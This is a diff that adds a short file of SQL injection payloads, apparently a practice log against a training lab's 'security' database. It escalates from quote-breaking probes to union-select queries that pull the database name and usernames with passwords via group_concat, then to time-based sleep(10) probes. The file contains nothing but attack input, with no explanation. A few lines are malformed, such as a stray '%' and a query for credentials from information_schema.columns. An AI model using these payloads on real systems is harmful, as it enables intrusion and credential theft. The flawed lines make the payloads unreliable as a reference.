@@ -1,0 +1,17 @@
+ID:1
+ID:1\
+ID:1'
+ID:1'
+ID:1"
+ID:1") union select 1,2,3 -- 
+ID:123123") union select 1,database(),3 -- 
+ID:123123") union select 1,database(),3 -- 
+ID:1
+ID:1123213'
+ID:1123213' union select 1,2,3-- 
+ID:" 1333")  union select 1,group_concat(id,username,password),3 from information_schema.columns where table_schema='security' and table_name='users' -- 
+ID:1333")  union select 1,group_concat(id,username,password),3 from information_schema.columns where table_schema='security' and table_name='users' -- 
+ID:1333")  union select%sleep(10),group_concat(id,username,password),3 from information_schema.columns where table_schema='security' and table_name='users' -- 
+ID:1333")  union select sleep(10),group_concat(id,username,password),3 from information_schema.columns where table_schema='security' and table_name='users' -- 
+ID:1333")  union select 1,2,3 -- 
+ID:1333")  union select 1,sleep(10),3 -- 
